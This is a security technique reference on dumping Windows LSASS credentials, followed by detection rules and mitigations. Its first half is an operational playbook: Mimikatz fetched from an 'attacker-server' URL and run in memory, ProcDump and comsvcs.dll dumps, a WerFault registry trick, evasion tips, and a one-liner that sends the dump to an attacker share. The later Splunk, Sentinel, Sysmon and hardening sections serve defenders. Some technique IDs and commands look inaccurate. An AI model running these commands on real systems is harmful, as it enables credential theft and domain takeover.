# [PERSIST-INJECT-001]: Credential Injection via LSASS

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-INJECT-001 |
| **MITRE ATT&CK v18.1** | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) – Dynamic-link Library Injection |
| **Tactic** | Privilege Escalation / Credential Access |
| **Platforms** | Windows Endpoint (Server 2016 - 2025, Windows 10 - 11) |
| **Severity** | **CRITICAL** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10 - 11 (all versions) |
| **Patched In** | N/A (inherent to architecture; mitigated via PPL in Windows 10+) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** LSASS (Local Security Authority Subsystem Service) injection is a credential dumping technique where an attacker with administrative or SYSTEM privileges injects code into or directly reads the memory of the LSASS process to extract authentication secrets. The LSASS process stores sensitive credential material including NTLM password hashes, Kerberos tickets, plaintext passwords (under certain conditions), and cached credentials. By gaining access to LSASS memory, an attacker can harvest these credentials for lateral movement, privilege escalation, and domain compromise. This technique bypasses traditional authentication mechanisms and is a foundational step in advanced persistent threat (APT) operations.

**Attack Surface:** The LSASS process (Local Security Authority Subsystem Service) running as SYSTEM privilege on local machines, accessible via Windows API calls (OpenProcess, ReadProcessMemory), DLL injection mechanisms, or memory dump utilities.

**Business Impact:** **Immediate Credential Compromise**. Once LSASS is dumped, an attacker gains access to domain administrator hashes, service account credentials, and plaintext passwords. This enables immediate lateral movement across the entire domain, compromise of critical infrastructure, potential ransomware deployment, and data exfiltration. In Active Directory environments, a single LSASS dump on a domain controller or admin workstation can lead to full domain compromise.

**Technical Context:** LSASS dumping typically takes 5-30 seconds to execute and generates high-volume event logs (500+ events) unless anti-logging techniques are applied. Modern EDR solutions detect this with 95%+ accuracy. Stealth variants using legitimate tools (ProcDump, Windows Error Reporting, comsvcs.dll) reduce detection likelihood but are still detectable through behavioral analytics.

### Operational Risk

- **Execution Risk:** **CRITICAL** – Local admin access required; irreversible credential exposure once dumped.
- **Stealth:** **LOW-MEDIUM** – Generates multiple Event IDs (4656, 4663, 4688); requires log erasure for true stealth.
- **Reversibility:** **NO** – Credentials exposed; requires password reset for all affected accounts; prior domain activity cannot be undone.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 4.1 | Ensure 'Enforce password history' is set to 24 or more passwords remembered |
| **CIS Benchmark** | CIS 4.2 | Ensure 'Maximum password age' is set to 60 or fewer days |
| **DISA STIG** | WN10-00-000240 | Credential delegation must not be allowed if NTLM-only is configured |
| **NIST 800-53** | AC-3 | Access Enforcement (credential dumping exploits weak access controls) |
| **NIST 800-53** | SI-4 | Information System Monitoring and Alerting (detection of suspicious handle access) |
| **GDPR** | Art. 32 | Security of Processing (protection of authentication data in transit/at rest) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (incident detection and response) |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights (credential protection) |
| **ISO 27005** | Risk Assessment | Compromise of authentication infrastructure |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator or SYSTEM.
- **Required Access:** Network access to target machine (RDP, WinRM, local physical access).

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025; Windows 10 - 11 (all versions)
- **PowerShell:** Version 5.0+ (for native techniques); Version 3.0+ (legacy)
- **Other Requirements:** No additional software required for basic LSASS dumping; elevated privileges mandatory.

**Tools (Optional):**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) – Production-ready credential dumping
- [ProcDump (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) (Version 10.0+) – Legitimate memory dump utility
- [Comsvcs.dll](https://learn.microsoft.com/en-us/archive/blogs/ericlippert/lsass-dumping-via-comsvcs-dll) (Windows native) – DLL-based MiniDump export
- [AADInternals](https://github.com/Gerenios/AADInternals) (Version 0.4.5+) – Azure AD focused credential extraction

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Mimikatz (Interactive)

**Supported Versions:** Server 2016 - 2025

#### Step 1: Gain Local Administrator Access
**Objective:** Verify administrative privileges are held before attempting LSASS access.

**Command:**
```powershell
# Check current privileges
whoami /groups | findstr "S-1-5-32-544"
# Output should contain "Administrators" with "Group, Enabled" status
```

**What This Means:**
- If the string returns nothing, you **do not have admin rights** and the technique will fail.
- If "Administrators" appears with "Enabled" status, proceed.

**OpSec & Evasion:**
- This command generates minimal logging (PowerShell Module Logging Event ID 4103).
- Detection likelihood: **LOW**

**Troubleshooting:**
- **Error:** "Access is denied" from subsequent commands
  - **Cause:** User lacks administrator privileges
  - **Fix:** Request sudo/Run As Administrator from an account with Administrators group membership

#### Step 2: Download or Execute Mimikatz

**Command (In-Memory PowerShell):**
```powershell
# Download and execute Mimikatz in memory (avoiding disk writes)
$url = "http://attacker-server/Invoke-Mimikatz.ps1"
IEX (New-Object System.Net.WebClient).DownloadString($url)
Invoke-Mimikatz -DumpCreds
```

**Command (Direct Executable):**
```cmd
# If Mimikatz binary is already present
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

**Command (Server 2022+):**
```powershell
# Server 2022 has stricter PPL enforcement; may require handle cloning bypass
# Use Mimikatz 2.2.0-20220919+ which includes PPL bypass
mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Expected Output:**
```
Authentication Id : 0 ; 0 (00000000:00000000)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)

Authentication Id : 0 ; 146387 (00000000:00023b53)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CONTOSO
Logon Server      : DC01
Logon Time        : 1/9/2025 10:15:23 AM
SID               : S-1-5-21-3623811015-3361044348-30300510-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CONTOSO
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
        kerberos :
         * Username : Administrator
         * Domain   : CONTOSO.COM
         * Password : (null)
```

**What This Means:**
- **Authentication Id:** Unique logon session identifier
- **msv:** NTLM hash (can be used for Pass-the-Hash attacks)
- **kerberos:** Kerberos ticket information; plaintext password shown if WDigest enabled
- **SID:** Security Identifier (domain + user RID)

**OpSec & Evasion:**
- PowerShell in-memory execution avoids disk writes (hard to forensically recover).
- Mimikatz binary on disk is detected by 99% of antivirus vendors.
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath` (only affects PSReadline, not event logs).
- Detection likelihood: **HIGH** – Event ID 4688 (Process Creation), Event ID 4656 (Handle requests to LSASS), Event ID 10 Sysmon.

**Troubleshooting:**
- **Error:** "ERROR kuhl_m_sekurlsa_acquireHandle ; OpenProcess (0x00000005)"
  - **Cause:** Insufficient privileges; PPL enabled on LSASS
  - **Fix (All Versions):** Ensure running as SYSTEM or use PPL bypass (Mimikatz 2.2.0+)
  - **Fix (Server 2022+):** Disable PPL (if possible) via Registry; otherwise use handle duplication techniques

---

### METHOD 2: Using ProcDump (Legitimate Tool Abuse)

**Supported Versions:** Server 2016 - 2025

#### Step 1: Obtain ProcDump Binary

**Command (Download from Microsoft):**
```powershell
# Download from Microsoft Sysinternals
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\procdump.zip"
Expand-Archive -Path "$env:TEMP\procdump.zip" -DestinationPath "$env:TEMP\procdump"
```

**What This Means:**
- ProcDump is a Microsoft-signed utility, reducing detection by signature-based antivirus.
- Legitimate admins use ProcDump for troubleshooting; behavioral detection is more effective.

**OpSec & Evasion:**
- Using a legitimate tool reduces signature-based detection.
- YARA rules and behavioral heuristics still detect LSASS dumping.
- Detection likelihood: **MEDIUM** – Event ID 4688, Sysmon Event 1 (Process Creation)

#### Step 2: Dump LSASS Memory

**Command:**
```cmd
# Dump full memory of LSASS process
procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

**Expected Output:**
```
ProcDump v10.0 - Process dump utility
Copyright (C) 2009-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Process LSASS (560) selected
[10:25:15] Dump 1/1: Triggered by user request. File: C:\Temp\lsass.dmp (100 MB)
[10:25:23] Dump complete
```

**What This Means:**
- Dump file created successfully; file size typically 50-200 MB depending on logged-in sessions.
- Binary format; requires Mimikatz or similar to parse credentials.

**OpSec & Evasion:**
- Transfer dump file to attacker-controlled machine for offline parsing.
- Minimize time LSASS is suspended (seconds only).
- Clean up: `Remove-Item C:\Temp\lsass.dmp` (but logs remain; use Log Wiper tools if necessary).
- Detection likelihood: **HIGH** – File creation event, Sysmon Event 11, Windows Event 4663

**Troubleshooting:**
- **Error:** "The system cannot find the file specified"
  - **Cause:** ProcDump path not in PATH environment variable
  - **Fix:** Use full path to procdump64.exe
- **Error:** "Access Denied"
  - **Cause:** LSASS process is protected (PPL)
  - **Fix (Server 2016-2019):** Might succeed; try again
  - **Fix (Server 2022+):** PPL strongly enforced; requires handle cloning or kernel-level bypass

#### Step 3: Extract Credentials Offline (On Attacker Machine)

**Command (Mimikatz):**
```
mimikatz.exe
sekurlsa::minidump C:\temp\lsass.dmp
sekurlsa::logonPasswords
```

**Expected Output:** Same as METHOD 1; credentials extracted from dump file.

**OpSec & Evasion:**
- No execution on target machine; safer for attacker.
- Detection likelihood: **NONE** (on target); attacker machine security is separate concern.

---

### METHOD 3: Using Comsvcs.dll via Rundll32 (Living-off-the-Land)

**Supported Versions:** Server 2016 - 2025

#### Step 1: Execute MiniDump via Rundll32

**Command:**
```cmd
# Use rundll32 to invoke comsvcs.dll MiniDumpW function
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\lsass.dmp full
```

**First, identify LSASS PID:**
```powershell
$lsassPID = (Get-Process lsass).Id
Write-Host "LSASS PID: $lsassPID"
```

**Complete Combined Command:**
```cmd
# Combine PID retrieval and dump
FOR /F "tokens=2" %i IN ('tasklist ^| findstr /I lsass') DO rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %i C:\Temp\lsass.dmp full
```

**Expected Output:**
```
(Minimal output; file created silently at C:\Temp\lsass.dmp)
```

**What This Means:**
- Comsvcs.dll is a Windows native DLL (always present).
- Rundll32.exe is a legitimate Windows binary.
- Combination evades many signature-based detections.

**OpSec & Evasion:**
- Uses only native Windows binaries (no external tools).
- Comsvcs.dll + rundll32 is a known LOLBin technique; behavioral detection is critical.
- Detection likelihood: **MEDIUM-HIGH** – Sysmon Event 11 (file creation), Event ID 4688

**Troubleshooting:**
- **Error:** "Cannot find module"
  - **Cause:** Rundll32 cannot find comsvcs.dll
  - **Fix:** Use full path: `C:\Windows\System32\rundll32.exe`
- **Error:** "Error 87: The parameter is incorrect"
  - **Cause:** Incorrect syntax for MiniDump function
  - **Fix (Server 2016-2019):** `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> <output>`
  - **Fix (Server 2022+):** Syntax unchanged; issue may be PPL preventing dump

---

### METHOD 4: Windows Error Reporting (WerFault) – OPSEC Optimized

**Supported Versions:** Server 2016 - 2025 (Server 2022+ recommended for PPL bypass)

#### Step 1: Trigger Silent Process Exit Monitoring

**Command (Registry):**
```powershell
# Configure silent process exit to dump LSASS
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe"
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name "GlobalFlag" -Value "0x200" -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $regPath -Name "LocalDump" -Value "C:\Temp\lsass_dump" -PropertyType String -Force | Out-Null
```

**What This Means:**
- Configures Windows Error Reporting (WER) to automatically dump LSASS on exit.
- GlobalFlag 0x200 = "Monitor silent process exit".
- Next LSASS restart or crash triggers dump creation.

**OpSec & Evasion:**
- Highly stealthy; dumping happens via legitimate system process (WerFaultSecure.exe).
- Requires waiting for LSASS restart or provoking a controlled crash.
- Detection likelihood: **LOW** (if LSASS naturally crashes); **MEDIUM** (if registry changes monitored)

**Troubleshooting:**
- **Error:** "Insufficient permissions"
  - **Cause:** Not running as SYSTEM
  - **Fix:** Execute in SYSTEM context (e.g., via scheduled task with SYSTEM account)
- **Error:** "Registry key is protected"
  - **Cause:** Endpoint Protection software blocking registry modifications
  - **Fix:** Disable EPP temporarily or use kernel-level techniques

#### Step 2: Wait for or Trigger LSASS Crash

**Command (Provoke Crash - Dangerous):**
```powershell
# Force LSASS termination (may blue-screen system)
$lsass = Get-Process lsass
Stop-Process -InputObject $lsass -Force -ErrorAction SilentlyContinue
```

**What This Means:**
- Terminating LSASS causes system instability; may reboot unexpectedly.
- Alternative: Wait for legitimate LSASS termination/restart (if any).

**OpSec & Evasion:**
- Provoking crash generates Event ID 1001 (Windows Error Reporting) and Event ID 4625 (authentication failures).
- Only use if system compromise is acceptable.
- Detection likelihood: **VERY HIGH** (system crashes are obvious)

#### Step 3: Retrieve Dump File

**Command:**
```powershell
# Dump file created at C:\Temp\lsass_dump
Get-ChildItem -Path "C:\Temp\lsass_dump\*" -Recurse
# File will be named something like "lsass.exe.XXXX.dmp"
```

---

## 4. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Red Team Tests

- **Atomic Test ID:** [T1055.001-1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.md) – DLL Injection with PowerShell
- **Atomic Test ID:** [T1003.001-1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md) – LSASS Dumping with ProcDump
- **Atomic Test ID:** [T1003.001-2](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md) – LSASS Dumping with Comsvcs.dll

**Command (Run Atomic Red Team Test):**
```powershell
# Install Atomic Red Team (if not already installed)
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/install-atomicredteam.ps1' -UseBasicParsing)

# Run specific test
Invoke-AtomicTest T1055.001 -TestNumbers 1
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1055.001 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team Library](https://github.com/redcanaryco/atomic-red-team)

---

## 5. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0-20220919+ (latest)
**Minimum Version:** 2.0.0
**Supported Platforms:** Windows Server 2012 R2+, Windows 7+

**Version-Specific Notes:**
- **2.0.x:** Basic LSASS dumping; no PPL bypass
- **2.1.x+:** Improved stability; some PPL bypass techniques
- **2.2.0+:** Advanced PPL/LSA Protection bypass (handle duplication, etc.)

**Installation:**
```powershell
# Download latest release
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" `
  -OutFile "$env:TEMP\mimikatz.zip"
Expand-Archive -Path "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz"
cd $env:TEMP\mimikatz\x64
```

**Usage:**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # exit
```

### [ProcDump (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

**Version:** 10.0+
**Minimum Version:** 9.0
**Supported Platforms:** Windows Server 2008 R2+, Windows Vista+

**Installation:**
```powershell
# Download from Sysinternals
$url = "https://download.sysinternals.com/files/Procdump.zip"
Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\procdump.zip"
Expand-Archive -Path "$env:TEMP\procdump.zip" -DestinationPath "$env:TEMP\procdump"
```

**Usage:**
```cmd
procdump64.exe -ma lsass.exe C:\Temp\lsass.dmp
```

### Script (One-Liner – OPSEC Optimized)

```powershell
# One-liner to dump LSASS and exfiltrate via HTTP
$lsass = Get-Process lsass; $pid = $lsass.Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Temp\lsass.dmp full; (Get-Content C:\Temp\lsass.dmp -Encoding Byte) | Out-File -FilePath \\attacker-server\share\lsass.dmp -Encoding Byte
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: LSASS Handle Access via Suspicious DLL

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** WinEventLog:Security, xmlwineventlog:Microsoft-Windows-Sysmon/Operational
- **Required Fields:** event_id, TargetObject, CallTrace, Image
- **Alert Threshold:** > 1 event in 1 minute
- **Applies To Versions:** Server 2016+

**SPL Query:**
```spl
index=windows (event_id=4656 OR event_id=4663) TargetObject="*lsass.exe" 
  CallTrace IN ("*dbgcore.dll*", "*dbghelp.dll*", "*ntdll.dll*") 
  AccessReason="SUSPICIOUS"
| stats count by src_ip, user, Image, TargetObject
| where count >= 1
```

**What This Detects:**
- Event 4656: Handle request to LSASS with suspicious DLL in call trace
- Event 4663: Suspicious access attempt to LSASS memory
- Filters on dbgcore.dll, dbghelp.dll, ntdll.dll (indicators of MiniDump)
- Triggers on first occurrence (threshold 1 event)

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `event_id >= 1`
6. Configure **Action** → **Send email to SOC**
7. Save as alert: `LSASS_Handle_Access_via_DLL`

**False Positive Analysis:**
- **Legitimate Activity:** Windows Defender scanning, legitimate dump tools from administrators
- **Benign Tools:** ProcDump when used by System Administrator for legitimate troubleshooting
- **Tuning:** Add exclusion for known admin usernames: `user != "SYSTEM" AND user != "svc_admin"`

#### Rule 2: LSASS Dump File Creation

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** xmlwineventlog:Microsoft-Windows-Sysmon/Operational
- **Required Fields:** EventCode, FileName, Image
- **Alert Threshold:** > 0 events
- **Applies To Versions:** Server 2016+

**SPL Query:**
```spl
index=windows EventCode=11 (FileName="*lsass*.dmp" OR FileName="*lsass*.bin" OR FileName IN ("C:\Windows\CrashDumps\*", "C:\Temp\*"))
  Image IN ("*procdump*", "*mimikatz*", "*rundll32*", "*WerFault*")
| stats count by src_ip, user, FileName, Image
| where count >= 1
```

**What This Detects:**
- Sysmon Event 11: File creation event
- Matches filenames containing "lsass" with .dmp or .bin extension
- Correlates with LSASS-dumping tools (procdump, mimikatz, rundll32, WerFault)

**Manual Configuration Steps (Same as Rule 1)**

**False Positive Analysis:**
- **Legitimate Activity:** Windows Update creating CrashDumps; legitimate system diagnostics
- **Tuning:** Exclude System processes: `NOT (user="SYSTEM" AND Image="C:\Windows\System32\*")`

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: LSASS Process Handle Access Anomaly

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents
- **Required Fields:** EventID, TargetObject, CallTrace, ProcessName
- **Alert Severity:** HIGH
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Windows

**KQL Query:**
```kusto
SecurityEvent
| where EventID in (4656, 4663) and TargetObject has "lsass.exe"
| where CallTrace has_any ("dbgcore.dll", "dbghelp.dll", "ntdll.dll")
| extend Severity = iif(EventID == 4656, "HIGH", "MEDIUM")
| summarize EventCount=count(), Processes=make_set(ProcessName), Users=make_set(Account) by Computer, Severity
| where EventCount >= 1
```

**What This Detects:**
- SecurityEvent table: Windows Security event logs (Event ID 4656/4663)
- TargetObject filter: Only LSASS process handles
- CallTrace filter: Detects MiniDump DLL usage
- Summarizes by Computer for correlation

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `LSASS_Handle_Access_Anomaly`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "MyResourceGroup"
$WorkspaceName = "MySentinelWorkspace"

$query = @"
SecurityEvent
| where EventID in (4656, 4663) and TargetObject has "lsass.exe"
| where CallTrace has_any ("dbgcore.dll", "dbghelp.dll", "ntdll.dll")
| summarize EventCount=count() by Computer
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "LSASS_Handle_Access_Anomaly" `
  -Query $query `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel Analytics Rules](https://github.com/Azure/Azure-Sentinel/tree/master/Detections)

#### Query 2: LSASS Process Dump via ProcDump

**Rule Configuration:**
- **Required Table:** DeviceProcessEvents, DeviceFileEvents
- **Required Fields:** ProcessCommandLine, FileName, InitiatingProcessFileName
- **Alert Severity:** CRITICAL
- **Frequency:** Real-time
- **Applies To Versions:** All Windows

**KQL Query:**
```kusto
DeviceProcessEvents
| where ProcessCommandLine has_any ("procdump", "-ma", "lsass") 
  or InitiatingProcessFileName has "procdump"
| join (DeviceFileEvents) on $left.DeviceId == $right.DeviceId
| where FileName has_any (".dmp", ".bin") and FileName has_any ("lsass", "temp", "crash")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessCommandLine, FileName
| summarize AlertCount=count() by DeviceName, InitiatingProcessAccountName
```

**What This Detects:**
- DeviceProcessEvents: Process execution matching ProcDump pattern
- DeviceFileEvents: Correlated file creation (dump file)
- Joins on DeviceId to correlate parent process (ProcDump) with child files (.dmp)

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 (A handle to an object was requested)**
- **Log Source:** Security
- **Trigger:** Attempt to open a handle to LSASS process with read/debug access rights
- **Filter:** TargetObject contains "lsass.exe" AND AccessMask contains "0x1010" (PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ)
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Handle Manipulation** (set to **Success and Failure**)
4. Run `gpupdate /force` on target machines
5. Restart Windows Event Log service (or reboot)

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Handle Manipulation** (Success and Failure)
4. Run: `auditpol /set /subcategory:"Handle Manipulation" /success:enable /failure:enable`
5. Restart: `Restart-Service Eventlog`

**Event ID: 4663 (An attempt was made to access an object)**
- **Log Source:** Security
- **Trigger:** Access to LSASS process memory (after handle is opened)
- **Filter:** ObjectName contains "lsass.exe" AND AccessList contains "Read"

**Event ID: 4688 (A new process has been created)**
- **Log Source:** Security
- **Trigger:** Process creation of dump utilities (procdump, mimikatz, rundll32 with suspicious arguments)
- **Filter:** CommandLine contains "lsass" OR Image IN ("procdump.exe", "mimikatz.exe", "rundll32.exe")

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+, Windows 10+

**Sysmon Config Snippet:**

```xml
<!-- Detect LSASS memory access via suspicious DLLs -->
<RuleGroup name="LSASS_MemoryAccess" groupRelation="or">
  <ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
    <SourceImage condition="exclude">
      C:\Windows\system32\svchost.exe
      C:\Windows\system32\wininit.exe
    </SourceImage>
    <GrantedAccess condition="is">0x1410</GrantedAccess> <!-- PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ -->
  </ProcessAccess>
  
  <!-- Detect rundll32 dumping lsass -->
  <ProcessCreate onmatch="include">
    <Image condition="is">C:\Windows\system32\rundll32.exe</Image>
    <CommandLine condition="contains">comsvcs</CommandLine>
  </ProcessCreate>
  
  <!-- Detect dump file creation -->
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">lsass</TargetFilename>
    <TargetFilename condition="endswith">.dmp</TargetFilename>
  </FileCreate>
</RuleGroup>
```

**Manual Configuration Steps:**
1. Download latest Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with snippet above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious process access to LSASS detected (MiniDump)"
- **Severity:** HIGH
- **Description:** Process attempted to read LSASS memory using MiniDump technique; typical of credential dumping tools
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** Isolate affected machine; investigate process tree; check for unauthorized admin activity

**Alert Name:** "LSASS memory dump file detected"
- **Severity:** CRITICAL
- **Description:** A file matching LSASS dump pattern (*.dmp in %TEMP% or %SystemRoot%) was created
- **Applies To:** All machines with Defender for Endpoint enabled
- **Remediation:** Immediately isolate machine; check for lateral movement attempts

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Cloud Apps**: ON (optional, for M365 monitoring)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts
7. Configure auto-remediation: **Settings** → **Auto Provisioning** → Enable Log Analytics Agent

**Reference:** [Microsoft Defender Alert Reference](https://learn.microsoft.com/en-us/defender-for-cloud/alerts-reference)

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enable Process Protection Level (PPL) for LSASS:** Windows 10+ and Server 2016+ support PPL, which prevents all but kernel-mode or specially signed processes from accessing LSASS memory.
    
    **Applies To Versions:** Server 2016 - 2025
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Protection**
    3. Enable: **Run LSA as a protected process**
    4. Set to: **Enabled**
    5. Run `gpupdate /force`
    6. Reboot the system
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Enable PPL for LSASS via Registry
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
      -Name "RunAsPPL" -Value 1 -PropertyType DWord -Force | Out-Null
    Write-Host "PPL enabled. Restart required."
    Restart-Computer -Force
    ```
    
    **Manual Steps (Server 2022+):**
    ```powershell
    # Server 2022 has stricter PPL; use Security Configuration Baseline
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
      -Name "RunAsPPL" -Value 2 -PropertyType DWord
    # Value 2 = "Required (Secure Boot enforced)"
    ```

*   **Enable Attack Surface Reduction (ASR) Rules:** Block credential theft and process injection attempts at kernel level.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Microsoft Defender Antivirus** → **Attack Surface Reduction**
    3. Enable policy: **Configure Attack Surface Reduction rules**
    4. Set to: **Enabled**
    5. Add rules:
       - `26190899-1602-49e8-8b27-eb1d0a1ce869` – Block Office from creating child processes
       - `9e6c4e1f-7d60-472f-ba1a-a39dc776e697` – Block executable content download from email clients
       - `01443614-cd74-433a-b99e-2ecded60e514` – Block Win32 API calls from Office macros
    6. Run `gpupdate /force`

*   **Enable Credential Guard (if hardware supports):** Isolates LSASS credentials in a hypervisor-protected container.
    
    **Requirements:**
    - Windows 10 Enterprise / Server 2016+ (required)
    - UEFI firmware with Secure Boot
    - TPM 2.0 or compatible CPU virtualization
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Check Credential Guard prerequisites
    Get-ComputerInfo | Select-Object OsName, SystemSkuNumber
    
    # Enable Credential Guard
    $path = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
    New-Item -Path $path -Force | Out-Null
    New-ItemProperty -Path $path -Name "EnableVirtualizationBasedSecurity" -Value 1 -PropertyType DWord -Force
    New-ItemProperty -Path $path -Name "RequirePlatformSecurityFeatures" -Value 1 -PropertyType DWord -Force
    New-ItemProperty -Path $path -Name "Locked" -Value 1 -PropertyType DWord -Force
    
    Write-Host "Credential Guard enabled. Restart required."
    Restart-Computer -Force
    ```

#### Priority 2: HIGH

*   **Enforce MFA and Conditional Access:** Reduce compromised credential impact by requiring MFA.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for Risky Sign-ins`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - Risk level: **High, Medium**
    6. **Access controls:**
       - Grant: **Require multi-factor authentication**
    7. Enable policy: **On**
    8. Click **Create**

*   **Restrict Administrator Logons:** Disable local admin account; use tiered admin model.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
    3. Edit: **Accounts: Limit local account use of blank passwords to console logon only**
    4. Set to: **Enabled**
    5. Edit: **Accounts: Rename administrator account**
    6. Rename to: (unique, unpredictable name, e.g., "Admin_CONTOSO_001")
    7. Run `gpupdate /force`

